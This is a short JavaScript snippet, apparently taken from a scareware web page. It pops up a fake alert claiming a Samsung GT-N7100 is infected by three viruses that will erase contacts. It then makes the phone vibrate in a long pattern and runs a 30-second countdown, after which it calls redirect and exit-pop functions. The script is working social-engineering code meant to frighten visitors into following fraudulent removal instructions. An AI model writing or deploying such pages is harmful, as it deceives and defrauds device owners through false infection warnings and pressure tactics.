alert("Warning: Your Samsung GT-N7100 has been infected by (3) viruses! Viruses will damage your mobile phone, SIM card and erase all your contacts! Please follow the instructions on the next page to remove the viruses.")

! function() {
  navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate, navigator.vibrate([1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3])
}
();

var count = 30;
var counter = setInterval(timer, 1000);

function timer() {
  count = count - 1;
  if (count <= 0) {
    clearInterval(counter);
    loc();
    exit_a1();
    PreventExitPop = false;
    return;
  }
  document.getElementById("timer").innerHTML = count;
}
